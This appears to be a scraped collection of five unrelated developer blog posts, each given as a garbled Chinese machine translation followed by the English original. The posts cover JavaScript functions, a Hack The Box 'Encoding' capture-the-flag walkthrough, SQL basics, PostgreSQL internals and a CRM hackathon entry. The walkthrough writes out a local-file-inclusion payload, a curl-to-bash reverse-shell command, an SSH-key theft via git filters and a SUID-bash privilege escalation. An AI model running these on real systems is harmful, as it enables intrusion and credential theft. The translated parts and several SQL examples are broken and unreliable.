2.1 regular function 2.1 正则函数

function Meal(name){
 this.name = name;
 }
 const oatMeal= new Meal("oats"); const oatMeal= new Meal("燕麦");

console.log(oatMeal instanceOf Meal) // logs true console.log(oatMeal instanceOf Meal) // 记录为真

箭头函数不能用作构造函数。 如果您尝试调用以 new 关键字为前缀的箭头函数，JavaScript 会抛出错误：

 const Meal = (name) => {
 this.name = name;
 }
 const oatMeal= new Meal("oats"); const oatMeal= new Meal("燕麦"); // error : Meal is not a constructor // 错误：膳食不是构造函数

调用 new Meal('oats')，其中 Meal 是一个箭头函数，抛出 TypeError: Meal is not a constructor。

演示（）； // return 100 // 返回 100

如果缺少 return 或 return 后没有语句，则常规函数隐式返回 undefined。

箭头函数以与常规函数相同的方式返回值，但有一个有用的例外。

如果省略花括号，则可以从箭头函数隐式返回表达式。 这些是内联箭头函数。

 const increment = (num) => num + 1;
 increment(401);

箭头函数隐式返回此表达式而不使用 return 关键字。

常规函数和箭头函数在一些重要方面有所不同，您可以根据自己的需要选择正确的语法。

您还知道箭头函数和常规函数之间还有哪些其他区别？

本文由Scattr 发布 ↗️



原文:

JavaScript functions can be defined in many ways. One can use the right syntax for specific needs by understanding the differences.

One of the usual way of defining a function is by using function keyword.



function double(x){
 return x*2;
}


const double = function(x){
 return x*2;
}

In this blog, I will refer to these types as regular functions.

A second way of defining a function, introduced in ES2015, is the arrow function syntax.

const double = (x) => x*2

In this blog, I will discuss some main differences between regular functions and arrow functions.

1. this value

1.1 regular function

Inside a regular function, this value (i.e. the context of execution) is dynamic, depends on how the function is invoked.

During simple invocation, the value of this is equal to the global object.

function demo(){
 console.log(this)

} 
demo(); // logs global window object

During method invocation, the value of this is equal to the object owning it.


const myDemo = { greet(){
 console.log(this);
 }

} 


myDemo.greet(); // logs myDemo Object

During constructor invocation, the value of this refers to the newly created instance.


function Demo() {
 console.log(this);

} 
new Demo(); // logs an instance of Demo

1.2 Arrow function

The value of this in case of arrow function is considerably different from that of regular function. Arrow function doesn't define it's own context of execution.

The value of this inside an arrow function is the same as that of it's outer function. In other words, arrow function resolve the value of this lexically and this behavior is independent of how and where the function is executed. 

const myDemo = { greet(){
 console.log(this); 


 const inner = () => {
 console.log(this); }
 inner();
 }

} 


myDemo.greet();

This great feature of arrow function make sure that when you use arrow function as callbacks, it doesn't define it's own execution context.

2. Constructors

2.1 regular function

function Meal(name){
 this.name = name;

} 
const oatMeal= new Meal("oats");

console.log(oatMeal instanceOf Meal) // logs true

Meal is a regular function, when invoked with new keyword create an instance of type Meal.

2.2 Arrow function

Arrow function cannot be used as a constructor. If you try to invoke an arrow function prefixed with new keyword, JavaScript throws an error:

const Meal = (name) => {
 this.name = name;

} 
const oatMeal= new Meal("oats"); // error : Meal is not a constructor

Invoking new Meal('oats'), where Meal is an arrow function, throws TypeError: Meal is not a constructor.

3. Implicit return

3.1 regular function

return expression statement returns the result from a function:

function demo() {
 return 100;

} 
demo(); // return 100

If the return is missing or there is no statement after return, then regular function implicitly return undefined.

3.2 Arrow function

Arrow functions return values the same way as regular functions, but with one useful exception.

You can implicitly return an expression from the arrow function if its curly braces are omitted. These are the inline arrows function.

const increment = (num) => num + 1;

increment(401);

num + 1 is the only expression in increment() arrow. The arrow function implicitly returns this expression without the use of the return keyword.

Regular and arrow functions differ in important ways that allow you to choose the right syntax based on your needs.

What other differences do you know between arrow functions and regular functions ?

This article is published w/ Scattr ↗️
item.author: mohitcodes

item.title: 破解盒子 - 编码 [中等] - 演练 | Hack The Box - Encoding [Medium] - Walkthrough
item.description:
由于这台机器的复杂性和一些小东西很难弄好，我花了几天时间。

您会发现以下漏洞：
我首先浏览网站以了解其功能。 我看到这是某种数据转换器，比如二进制到十六进制等等。 但有趣的部分是：

如果需要，您可以指定一个 URL，该 URL 将返回要使用file_url参数转换的数据。 这可以为字符串和整数转换完成。

这很快让我想起了本地/远程文件包含，因此我尝试使用以下有效负载：

 json_data = { 'action': 'b64encode', 'file_url' : 'file:///etc/passwd' }

这给了我以 base64 编码的/etc/passwd文件的内容，我使用base64 -d对其进行解码。 从那里我看到了另一个用户svc 。

我也很好奇/var/www/目录中有什么，所以我开始枚举目录。

我在主要网站haxtables.htb/FUZZ上运行了ffuf ，也运行了ffuf来发现子域。

 $ ffuf -w $disc_wc/raft-small-directories-lowercase.txt -u http://haxtables.htb/FUZZ $ ffuf -w $disc_wc/common.txt -u http://haxtables.htb/ -H "Host: FUZZ.haxtables.htb" -fs 1999

通过这些，我发现了api, image子域，因此我通过 LFI 漏洞/var/www/image/index.php检查了它们，以检查该应用程序是否使用了某种数据库或最终使用了一些有用的东西。 我发现image域包含一个 git 存储库（通过/var/www/image/index.php -> uitls.php中的git_status, git_log, git_commit函数）。 这让我相信我以后可以用它来获得用户权限。 我决定转储存储库并在这里忍受我，我通过充当gitdumper.sh代理的本地服务器以最贫民窟的方式做到了

import requests import json from flask import Flask import base64 app = Flask(__name__) @app.route('/<path:filepath>') def index(filepath): json_data = { 'action': 'b64encode', 'file_url' : "file://" + "/var/www/image/" + filepath } response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data) d = json.loads(response.text.strip()) res = base64.b64decode(d["data"]) return res
 $ gitdumper.sh http://localhost:5000/.git/ ./dump_repo

然后我使用git ls-files来确定文件夹中还有哪些其他文件。

 $ git ls-files actions/action_handler.php actions/image2pdf.php assets/img/forestbridge.jpg includes/coming_soon.html index.php scripts/git-commit.sh utils.php

我利用LFI漏洞看到了actions/action_handler.php源码。

 <?php include_once 'utils.php'; if (isset($_GET['page'])) { $page = $_GET['page']; include($page); # <-- BruhMoment } else { echo jsonify(['message' => 'No page specified!']); } ?>

很明显，这段代码容易受到 LFI 的攻击，我可以使用它通过 PHP 过滤器获得反向 shell。 但是我不能直接访问这个页面，所以我可以使用第一个LFI来执行这个LFI来执行PHP过滤器RCE ...

这是我在尝试了 2 天后弄清楚的……

我使用PHP 过滤器链生成器生成了一个有效载荷。

 $ python3 php_filter_chain_generator.py --chain '<?= `curl http://myIp/rev_bash_norm.sh|bash` ;?>'

我托管了一个包含rev_bash_norm.sh的网络服务器，我不会展示生成的过滤器请求的全部怪异，但最终它看起来像这样：

 POST /v3/tools/string/index.php HTTP/1.1 Host: api.haxtables.htb Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Content-Type: application/json Content-Length: 12920 { "action": "b64encode", "file_url" : "email@image.haxtables.htb/actions/action_handler.php?page=php://filter/<bruhmoment>" }

每当执行时，此请求都会产生一个反向 shell。

下一节是我尝试过但失败的部分，请随意跳过。

<i-tried-this>
我很确定它与git脚本有关并且我只有.git文件夹的rwxr-xr-x权限，所以我尝试使用转储存储库模拟文件编辑并更改所有文件服务器上的.git目录。

这是一种正确的方法，但我没有注意到我需要检索的ssh密钥，所以我很难坚持这一点，我去了一些文章。

</i-tried-this>

检查gatogamer1155的关于获取用户访问权限的文章并检索第一个标志。

创建一个可执行文件/tmp/readkey ，其内容读取~/.ssh/id_rsa文件并将其保存到文件中。

  • 使用名为缩进的新过滤器创建一个 git 属性文件： '*.php filter=indent'
  • 将 Git 配置filter.indent.clean设置为命令/tmp/readkey 。 这告诉 Git 将indent过滤器应用于以.php结尾的文件，并使用/tmp/readkey命令来处理过滤器。
  • 使用sudo -u svc执行/var/www/image/scripts/git-commit.sh
  • 然后应用过滤器，您可以读取私钥文件。

    • 注意：确保每当您在计算机上保存私钥时，都在文件末尾添加一个空行，否则您会收到错误消息！

    使用svc用户登录后，您可以读取第一个标志。

    老实说，这太容易了，但我不介意，因为我花了太多时间做这个盒子。

    执行sudo -l将为您提供可以作为 root 执行的可执行文件。

     (root) NOPASSWD: /usr/bin/systemctl restart *

    我必须创建一个看起来像这样的服务并将其放在/etc/systemd/system/syl.service下

    [Service] Type=simple ExecStart=chmod +s /bin/bash [Install] WantedBy=multi-user.target

    并简单地执行：

     $ sudo /usr/bin/systemctl restart syl $ bash -p bash-5.1# cat root/root.txt . . .


    原文:

    This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.

    You will find the following vulnerabilities:
    - Local File Inclusion
    - Command Injection or RCE

    I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on. But the interesting part was this:

    If required, you can specify a URL that will return data to be converted with the file_url parameter. This can be done for both string and integer convertions.

    That quickly reminded me of local/remote file inclusion, and so I've tried it with the following payload:

    json_data = { 'action': 'b64encode', 'file_url' : 'file:///etc/passwd'
}

    That gave me the contents of the /etc/passwd file encoded in base64, I used base64 -d to decode it. From there I saw another user svc.

    I was also curious what's in the /var/www/ directory, so I began enumerating the directory.

    I ran ffuf on the main website haxtables.htb/FUZZ also ran ffuf for subdomain discovery.

    $ ffuf -w $disc_wc/raft-small-directories-lowercase.txt -u http://haxtables.htb/FUZZ

$ ffuf -w $disc_wc/common.txt -u http://haxtables.htb/ -H "Host: FUZZ.haxtables.htb" -fs 1999

    With those I found api, image subdomains, so I inspected them via the LFI vulnerability /var/www/image/index.php to check whether this application uses some kind of database or eventually some useful things. I found that image domain contains a git repository (through git_status, git_log, git_commit functions in /var/www/image/index.php -> uitls.php). This led me to believe that I could use that to gain user privileges later on. I decided to dump the repository and bear with me here I did it in the most ghetto way possible, through a local server that acted as a proxy for gitdumper.sh

    import requests
import json
from flask import Flask
import base64 app = Flask(__name__) @app.route('/<path:filepath>')
def index(filepath): json_data = { 'action': 'b64encode', 'file_url' : "file://" + "/var/www/image/" + filepath } response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data) d = json.loads(response.text.strip()) res = base64.b64decode(d["data"]) return res

    $ gitdumper.sh http://localhost:5000/.git/ ./dump_repo

    Then I used the git ls-files to figure what other files are in the folder.

    $ git ls-files
actions/action_handler.php
actions/image2pdf.php
assets/img/forestbridge.jpg
includes/coming_soon.html
index.php
scripts/git-commit.sh
utils.php

    I saw the actions/action_handler.php source code by using the LFI vulnerability.

    <?php
include_once 'utils.php';
if (isset($_GET['page'])) { $page = $_GET['page']; include($page); # <-- BruhMoment
} else { echo jsonify(['message' => 'No page specified!']);
}
?>

    It is pretty obvious that this code is vulnerable to LFI, and I can use it to gain a reverse shell through PHP Filters. But I can't access this page directly, so I can use the first LFI to execute this LFI to execute the PHP filters RCE...

    And this is me figuring out this after 2 days of trying...

    I generated a payload with the PHP filter chain generator.

    $ python3 php_filter_chain_generator.py --chain '<?= `curl http://myIp/rev_bash_norm.sh|bash` ;?>'

    And I hosted a web server containing the rev_bash_norm.sh, I won't show the full monstrosity of the generated filter request but in the end it looked like this:

    POST /v3/tools/string/index.php HTTP/1.1
Host: api.haxtables.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 12920 { "action": "b64encode", "file_url" : "email@image.haxtables.htb/actions/action_handler.php?page=php://filter/<bruhmoment>"
}

    Whenever executed, this request will spawn a reverse shell.

    The www-data to svc(user) was honestly too much for me, and I turned to some write-ups.

    The next section is what I've tried and failed, feel free to skip it.

    <i-tried-this>
    I was pretty sure that it has something to do with the git scripts and I only had rwxr-xr-x permissions of the .git folder, so I've tried to simulate file edit by using the dumped repository and change all the files in the .git directory on the server.

    And that was kinda the right approach, but I didn't notice the ssh keys that I needed to retrieve, so I was hard stuck at this, and I went to some write-ups.

    </i-tried-this>

    Check gatogamer1155's write-up for gaining access to the user and retrieve the first flag.

    TLDR:

    • Creates an executable file /tmp/readkey with a content that reads the ~/.ssh/id_rsa file and saves it to file.
    • Creates a git attributes file with a new filter called indent: '*.php filter=indent'
    • Sets the Git configuration filter.indent.clean to the command /tmp/readkey. This tells Git to apply the indent filter to files ending in .php and to use the /tmp/readkey command to process the filter.
    • Execute the /var/www/image/scripts/git-commit.sh with sudo -u svc
    • The filter is then applied, and you can read the private key file.

    NOTE: Make sure that whenever you save the private key on your machine add an empty line at the end of the file otherwise you will get an error!

    After logging with the svc user, you can read the first flag.

    Honestly, this was too easy, but I didn't mind it since I spent too much time doing this box.

    Executing the sudo -l would give you the executables that you can execute as root.

    (root) NOPASSWD: /usr/bin/systemctl restart *

    I had to create a service that looks like that and place it under /etc/systemd/system/syl.service

    [Service]
Type=simple
ExecStart=chmod +s /bin/bash
[Install]
WantedBy=multi-user.target

    And simply execute:

    $ sudo /usr/bin/systemctl restart syl
$ bash -p
bash-5.1# cat root/root.txt
. . .
item.author: syrull

item.title: 用于数据分析的 SQL 简介 | INTRODUCTION TO SQL FOR DATA ANALYSIS
item.description:
宁罗德马西尼

发表于 2 月 18 日

它是主要关系数据库管理系统（如 MySQL、ORACLE 和 SQL Server）使用的最流行的查询语言。 我们可以使用 SQL 以高效简单的方式创建数据库并与之交互。 相反，我们只是简单地指定要检索的内容，其余的由 SQL 完成。 尽管称为查询语言，SQL 除了查询之外还可以做更多的事情。 数据，操作数据库中的数据，声明约束并以各种方式从数据库中检索数据，具体取决于我们的要求。

关系数据库

在这里，我们将讨论关系数据库，这是它们之间预定义关系的集合。 它收集使用表、行（记录）和列（字段）的不同类型的数据集。 表用于存储实体的信息，例如学生实体，而字段用于保存实体的各种特征，例如学号，年龄和课程，而记录是关于特定的存储数据实体。

基本 SQL 语法

注意：在每个语句的末尾使用分号来标记单个 SQL 语句的结束。
注意： USE 语句用于制作指定的
数据库作为活动数据库。

注意：主键用于唯一标识表中的每条记录。

但是，在使用此语句时应该非常小心，因为它无法撤消。

删除表的语法：


删除数据库的语法：

 DROP DATABASE databaseName;

用于数据操作的 SQL

使用 SQL 的数据操作意味着检索现有数据、插入新数据、删除现有数据或修改数据库中的现有数据。

例如，在以学号、姓名、年龄、性别为字段的学生表中，可以按如下方式插入记录：

 INSERT INTO Student(reg_no, name, age, gender) VALUES(123, "James",23,"Male"),(234,"Mary",34,"Female");

例如：

 UPDATE table_name SET attribute1 = value1, attribute2 = value2 WHERE condition

用于数据查询的 SQL

用户输入称为查询的 SQL 命令，其中对要检索的数据的特定要求是

假如。

句法：


 SELECT attribute1, attribute2, ... FROM table_name WHERE condition;

例如;

 SELECT name, age, course FROM Students WHERE age>20;

例如，下面的例子用于选择年龄大于20岁的学生；

 SELECT name, age, course FROM Students WHERE age>20;

它们用于根据这些表中某些列之间的关系从两个或多个表中查询数据。

不同的 SQL 连接

不同的 SQL 连接

内部联接

例如下面的人员和订单表：

人员表：

姓名地址城市
约翰基苏木
宁录涅里
猫王穆兰加

订单表：

订单号订单号订单_PID
要执行 INNER JOIN，我们使用以下 SELECT STATEMENT：

 SELECT P_ID, Name, Order_ID FROM person INNER JOIN P_ID ON P_ID=Order_PID;

结果集看起来是这样的：

姓名订单号
猫王猫王约翰约翰左连接

句法：

 SELECT Name, Order_ID FROM Persons LEFT JOIN Orders ON P_ID=Order_PID;

这会产生以下集合：

姓名订单号
猫王猫王约翰约翰宁录

正确加入

句法：

 SELECT Name, Order_ID FROM Persons RIGHT JOIN Orders ON P_ID=Order_PID;

这将返回以下结果：

姓名订单号
猫王猫王约翰约翰全连接

当其中一个表中存在匹配项时返回行。
句法：

 SELECT Names, Order_ID FROM Persons FULL JOIN Orders ON P_ID=Orders_PID;

这将产生以下结果：

姓名订单号
猫王猫王约翰约翰宁录
一旦暂停，nimrodmasini 将无法发表评论或发布帖子，直到他们的暂停被解除。

解除暂停后，nimrodmasini 将能够再次发表评论和发布帖子。

一旦取消发布，nimrodmasini 的所有帖子都将隐藏起来，只有他们自己可以访问。

如果 nimrodmasini 没有被暂停，他们仍然可以从他们的仪表板重新发布他们的帖子。

笔记：

感谢您保护 DEV 社区 👩‍💻👨‍💻 的安全。 您可以通过以下方式标记 nimrodmasini：

降低 nimrodmasini 的所有帖子的可见度

报告其他不当行为

取消标记 nimrodmasini 将恢复其帖子的默认可见性。



原文:

nimrodmasini

Posted on Feb 18

SQL is a short form for Structured Query Language. It is the most popular query language used by major relational database management systems such as MySQL, ORACLE and SQL Server. SQL is easy to learn as the statements comprise of descriptive English words and are not case sensitive. We can create and interact with a database using SQL in an efficient and easy way. The benefit with SQL is that we don’t have to specify how to get the data from the database. Rather, we simply specify what is to be retrieved, and SQL does the rest. Although called a query language, SQL can do much more besides querying. SQL provides statements for defining the structure of

the data, manipulating data in the database, declare constraints and retrieve data from the database in various ways, depending on our requirements.

Relational Databases

Here we'll be discussing on Relational Databases, which is a collection of pre-defined relationships between them. It collects different types of data sets that use tables, rows(records) and columns(fields). A table is used to store information about an entity, for example, a student entity, whereas fields are used to hold the various characteristics of an entity such as the student registration number, age and course, while records are the stored data about a particular entity.

Basic SQL Syntax

- CREATE DATABASE The create database statement is used in creating a database, for example, creating a database called Student, we create as below:

CREATE DATABASE DatabaseName; 
USE DatabaseName;

NB: A Semi-colon is used at the end of each statement to mark the end of a single SQL statement.
NB: USE statement is used for making the specified
database as active database.

- CREATE Table After creating a database, we create tables which are used to hold the various database entities, their records and fields, for example:

CREATE TABLE Student{
StudentID PRIMARY KEY INT NOT NULL,
StudentName VARCHAR(20) NOT NULL,
Course VARCHAR(20) NOT NULL
};

NB: A primary key is used to uniquely identify each record in a table.

- DESCRIBE Table The DESCRIBE statement is used to create the structure of an already created table, as below;

- DROP Statement The DROP statement is used to remove a table or a database permanently from a system. However, one should be very cautious while using this statement because it cannot be undone.

Syntax to drop a table:


Syntax to drop a database:

DROP DATABASE databaseName;

SQL For Data Manipulation

Data Manipulation using SQL means either retrieval of existing data, insertion of new data, removal of existing data or modification of existing data in the database.

- Insertion of Records The INSERT INTO statement is used to insert new records in a table. For example, in a student table with, registration number, name, age, and gender as fields, records can be inserted as below:

INSERT INTO Student(reg_no, name, age, gender) VALUES(123, "James",23,"Male"),(234,"Mary",34,"Female");

- Data Updation The UPDATE statement is used to make changes in the value(s) of one or more columns of existing records in a table. For example:

UPDATE table_name
SET attribute1 = value1, attribute2 = value2
WHERE condition

- Data Deletion The DELETE statement is used to delete one or more records from a table.Synax:

DELETE FROM table_name
WHERE condition;

SQL For Data Queries

SQL has efficient mechanisms to retrieve data stored in multiple tables. The user enters the SQL commands called queries where the specific requirements for data to be retrieved are

provided.

- SELECT Statement Is used to retrieve data from the tables in a database.

Syntax:


SELECT attribute1, attribute2, ...
FROM table_name
WHERE condition;

For example;

SELECT name, age, course
FROM Students
WHERE age>20;

- WHERE Clause Is used to retrieve data that meet some specified conditions. For example, the below example is used to select students whose age is greater than 20 years old;

SELECT name, age, course
FROM Students
WHERE age>20;

- ORDER BY Clause The ORDER BY clause is used to display data in an ordered form with respect to a specified column.For example;

SELECT *
FROM employee
ORDER BY salary;

SQL Joins

They are used to query data from two or more tables, based on a relationship between certain columns in these tables.

Different SQL Joins

JOIN-Returns rows when there is at least one match in both tables.
LEFT JOIN-Returns all rows from the left table, even if there are no matches in the right table.
RIGHT JOIN-Returns all rows from the right table even if there are no matches in the left table.
FULL JOIN-Returns rows when there is a match in one of the tables.

Different SQL Joins

Inner Join

The INNER JOIN keyword returns rows when there is at least one match in both. For example the persons and orders taable below:

Persons Table:

P_ID Name Address City
1 John 13 Kisumu
2 Nimrod 2 Nyeri
3 Elvis 1 Muranga

Orders table:

Order_ID Order_No Order_PID
1 1245 3
2 1256 3
3 1367 1
4 4398 1
5 4392 15

To perform INNER JOIN, we use the following SELECT STATEMENT:

SELECT P_ID, Name, Order_ID
FROM person
INNER JOIN P_ID ON P_ID=Order_PID;

The results set will look lie this:

Name Order_ID
Elvis 1245
Elvis 1256
John 1367
John 4398

Left Join

The LEFT JOIN keyword returns all the rows from the left table(Persons), even if there are no matches in the right table(Orders).
Syntax:

SELECT Name, Order_ID
FROM Persons
LEFT JOIN Orders ON P_ID=Order_PID;

This yields the following set:

Name Order_ID
Elvis 1245
Elvis 1256
John 1367
John 4398
Nimrod

Right Join

The RIGHT JOIN keyword returns all the rows from the right table(Orders), even if there are no matches in the left table(Persons).
Syntax:

SELECT Name, Order_ID
FROM Persons
RIGHT JOIN Orders ON P_ID=Order_PID;

This returns the following result:

Name Order_ID
Elvis 1245
Elvis 1256
John 1367
John 4398
4392

Full Join

Returns rows when there is a match in one of the tables.
Syntax:

SELECT Names, Order_ID
FROM Persons
FULL JOIN Orders ON P_ID=Orders_PID;

This would yield the following:

Name Order_ID
Elvis 1245
Elvis 1256
John 1367
John 4398
Nimrod
4392

item.title: PostgreSQL 数据库集群、数据库和表：初学者指南 | PostgreSQL Database Cluster, Databases, and Tables: A Beginner's Guide
item.description:
如果您是 PostgreSQL 的新手，则必须了解 PostgreSQL 数据库集群的逻辑和物理结构。 在本文中，我们将向您介绍 PostgreSQL 数据库集群、数据库和表的基本概念。

数据库集群逻辑结构

数据库是数据库对象的集合，包括表、索引、视图、序列和函数。 在PostgreSQL中，数据库本身也是数据库对象，在逻辑上相互分离。 所有其他数据库对象都属于它们各自的数据库，并在内部由对象标识符 (OID) 管理。 结构快照如下：

数据库对象和相应 OID 之间的关系存储在适当的系统目录中，具体取决于对象的类型。 例如，数据库和堆表的OID分别存储在pg_database和pg_class中。 您可以通过发出 SQL 查询找出您想知道的 OID。 像这样：

数据库集群的物理结构

基本目录包含几个子目录和许多文件。 数据库是基目录下的一个子目录，每个表和索引至少是一个存放在其所属数据库的子目录下的文件。

表空间是 PostgreSQL 独有的特性，不同于其他 RDBMS 中的表空间。 附上快照以便更好地理解：

数据库集群的布局

官方文档中描述了 PostgreSQL 数据库集群的布局。 基本目录下列出了主要文件和子目录，包括pg_xlog、pg_wal、pg_twophase和pg_multixact。

数据库布局

数据库是基目录下的子目录，数据库目录名与各自的OID相同。 例如，当数据库sampledb的OID为16384时，其子目录名称为16384。

与表和索引相关联的文件布局

每个大小小于 1GB 的表或索引都是一个单独的文件，存储在它所属的数据库目录下。 表和索引在内部由单独的 OID 管理，而数据文件由变量 relfilenode 管理。 表和索引的 relfilenode 值基本匹配各自的 OID。

堆表文件的内部布局

在数据文件（堆表和索引，以及空闲空间映射和可见性映射）内部，文件被分成固定长度的页或块。 每页从0开始依次编号，这样的编号称为块号。 如果文件已满，PostgreSQL 会在文件末尾添加一个新的空页以增加其大小。

表内页面的内部布局包含三种数据：堆元组、行指针和标题数据。 堆元组是从页面底部开始按顺序堆叠的记录数据。 行指针有 4 个字节长，并保存指向每个堆元组的指针。 它们形成一个简单的数组，用作元组的索引。 每个索引从1开始依次编号，称为偏移号。 当一个新的元组被添加到页面时，一个新的行指针也被推到数组上以指向新的元组。

截图如下：

读写元组：

在顺序扫描中，通过扫描每个页面中的所有行指针来顺序读取所有页面中的所有元组。 对于大型表，此方法可能很耗时。

另一方面，B 树索引扫描是一种更有效的访问元组的方法。 索引文件包含索引元组，每个索引元组由一个索引键和指向目标堆元组的 TID 组成。 如果找到具有您要查找的键的索引元组，PostgreSQL 将使用获得的 TID 值读取所需的堆元组。 此方法避免了不必要的页面扫描，并提供了一种更快的方式来访问表中的特定元组。

总之，了解写入和读取堆元组的方法对于在 PostgreSQL 中处理数据至关重要。 通过使用 B 树索引扫描等高效方法，开发人员可以优化他们的应用程序并提高系统性能。 截图如下：

结论

了解 PostgreSQL 数据库集群的逻辑和物理结构对于管理和优化数据库性能至关重要。 我们希望本文能让您对 PostgreSQL 数据库集群、数据库和表有一个基本的了解。 随着我深入这个广阔而有趣的领域，我将分享更多......

参考：

www.interdb.jp/pg/pgsql01.html#_1.1 . www.interdb.jp/pg/pgsql01.html#_1.1 。



原文:

PostgreSQL is a powerful open-source relational database management system (RDBMS) used by many organizations and individuals around the world. If you are new to PostgreSQL, it's essential to understand the logical and physical structure of a PostgreSQL database cluster. In this article, we'll introduce you to the basic concepts of a PostgreSQL database cluster, databases, and tables.

1.1. Logical Structure of Database Cluster

A PostgreSQL database cluster is a collection of databases managed by a PostgreSQL server running on a single host. A database is a collection of database objects that include tables, indexes, views, sequences, and functions. In PostgreSQL, databases themselves are also database objects and are logically separated from each other. All other database objects belong to their respective databases and are internally managed by object identifiers (OIDs). The structure snapshot is as follows:

The relations between database objects and the respective OIDs are stored in appropriate system catalogs, depending on the type of objects. For example, OIDs of databases and heap tables are stored in pg_database and pg_class, respectively. You can find out the OIDs you want to know by issuing SQL queries. Like this:

1.2. Physical Structure of Database Cluster

A PostgreSQL database cluster consists of a base directory, which is created when you initialize a new database cluster using the initdb utility. The base directory contains several subdirectories and many files. A database is a subdirectory under the base directory, and each table and index is at least one file stored under the subdirectory of the database to which it belongs.

PostgreSQL also supports tablespaces, which are directories that contain some data outside of the base directory. Tablespaces are a feature unique to PostgreSQL and are different from tablespaces in other RDBMS. A snapshot is attached for a better understanding:

1.2.1. Layout of a Database Cluster

The layout of the PostgreSQL database cluster is described in the official documentation. Main files and subdirectories are listed under the base directory, including pg_xlog, pg_wal, pg_twophase, and pg_multixact.

1.2.2. Layout of Databases

A database is a subdirectory under the base directory, and the database directory names are identical to the respective OIDs. For example, when the OID of the database sampledb is 16384, its subdirectory name is 16384.

1.2.3. Layout of Files Associated with Tables and Indexes

Each table or index whose size is less than 1GB is a single file stored under the database directory it belongs to. Tables and indexes are internally managed by individual OIDs, while data files are managed by the variable relfilenode. The relfilenode values of tables and indexes basically match their respective OIDs.

1.2.4. The Internal Layout of a Heap Table File

Inside the data file (heap table and index, as well as the free space map and visibility map), the file is divided into fixed-length pages or blocks. The default page size in PostgreSQL is 8192 bytes (8 KB). Each page is numbered sequentially from 0, and such numbers are called block numbers. If a file is filled up, PostgreSQL adds a new empty page to the end of the file to increase its size.

The internal layout of a page within a table contains three kinds of data: heap tuples, line pointers, and header data. Heap tuples are record data that are stacked in order from the bottom of the page. Line pointers are 4 bytes long and hold a pointer to each heap tuple. They form a simple array, which serves as an index to the tuples. Each index is numbered sequentially from 1 and called an offset number. When a new tuple is added to the page, a new line pointer is also pushed onto the array to point to the new one.

A snapshot is as follows:

1.2.5. Reading and Writing Tuples:

o read heap tuples, there are two typical access methods: sequential scan and B-tree index scan. In sequential scan, all tuples in all pages are sequentially read by scanning all line pointers in each page. This method can be time-consuming for large tables.

On the other hand, B-tree index scan is a more efficient method of accessing tuples. An index file contains index tuples, each of which is composed of an index key and a TID pointing to the target heap tuple. If the index tuple with the key that you are looking for has been found, PostgreSQL reads the desired heap tuple using the obtained TID value. This method avoids unnecessary scanning in the pages and provides a faster way to access specific tuples within a table.

In conclusion, understanding the methods of writing and reading heap tuples is essential for working with data in PostgreSQL. By using efficient methods such as B-tree index scans, developers can optimize their applications and improve their system's performance. A snapshot is as follows:

1.2.6. Conclusion

Understanding the logical and physical structure of a PostgreSQL database cluster is essential for managing and optimizing database performance. We hope that this article has given you a basic understanding of PostgreSQL database clusters, databases, and tables. I will be sharing more as I go deeper into this vast and interesting field...

References:

www.interdb.jp/pg/pgsql01.html#_1.1.

item.title: Tiny CRM - Linode + DEV 黑客马拉松提交 | Tiny CRM - Linode + DEV Hackathon Submission
item.description:
我建立了一个名为TinyCRM的 CRM（客户关系管理）系统。

类别提交：

我将在SaaS Superstars类别中提交此项目。
因为这个项目有可能成为一个盈利的 SaaS 产品。

应用链接

该应用程序的演示可在此处获得。

使用以下凭据登录 -
电子邮件 - admin@tinycrm.com
密码-密码

注意：测试数据每小时刷新一次。

截图

描述

该 CRM 系统可帮助中小企业轻松跟踪其销售情况并管理客户关系。

此应用程序中包含以下实体 -

链接到源代码

这是为Dev上的 Linode 黑客马拉松创建的应用程序。

技术栈

  • 长丝PHP
  • 顺风 CSS
  • 高山JS
  • 数据库

现场演示

应用程序的现场演示可在此处获得。

本地安装

  1. 克隆存储库
  2. 运行以下命令 -
 替换.env文件中的数据库凭据。
 DB_CONNECTION=pgsql DB_HOST=127.0.0.1 DB_PORT=5432 DB_DATABASE=tiny_crm DB_USERNAME=postgres DB_PASSWORD=password
  1.  现在运行以下命令在数据库中创建所需的表 -
 或者，您可以通过运行播种机来创建虚拟数据 -



许可许可

麻省理工学院许可证

背景

目前市场上有很多CRM系统，如Salesforce、Microsoft Dynamics等。
这些系统的问题在于它们非常广泛且非常昂贵且不易使用，并且还需要专门的开发人员来管理它，这对于中小企业来说很难使用并继续使用这些系统。

因此，我决定制作一个易于使用的 CRM 系统，具有重要的必需功能，同时对中小企业来说不太昂贵。

我是如何建造它的

我将linode 的计算实例用于服务器，将 linode 的托管 PostgreSQL 数据库用于持久存储。

在制作这个应用程序时，我学会了在 linode 的云平台中创建计算实例。
我还学会了在服务器上安装 Ngnix 服务器和 SSL 证书。

我还学习了在云上创建一个托管数据库实例，以及为什么它对于单独的开发人员和小型团队来说是一种简单的解决方案，因为他们不需要自己管理数据库。

我使用Laravel Web 框架来创建应用程序。 我还使用Filament管理面板生成器来快速生成 CRUD 应用程序功能。

其他资源/信息

  1. 在 Linode 上使用 Laravel 框架搭建了一个网站

  2. Linode Products Linode产品



原文:

I have built a CRM (Customer Relationship Management) system named TinyCRM.

Category Submission:

I am submitting this project in the SaaS Superstars category.
As this project has a potential to become a profitable SaaS product.

App Link

The demo of the application is available here.

Use the below credentials to login -
Email - admin@tinycrm.com
Password - password

Note: The test data is refreshed every hour.

Screenshots

Description

This CRM systems help SMEs tracking their sales and manage the customer relationships easily.

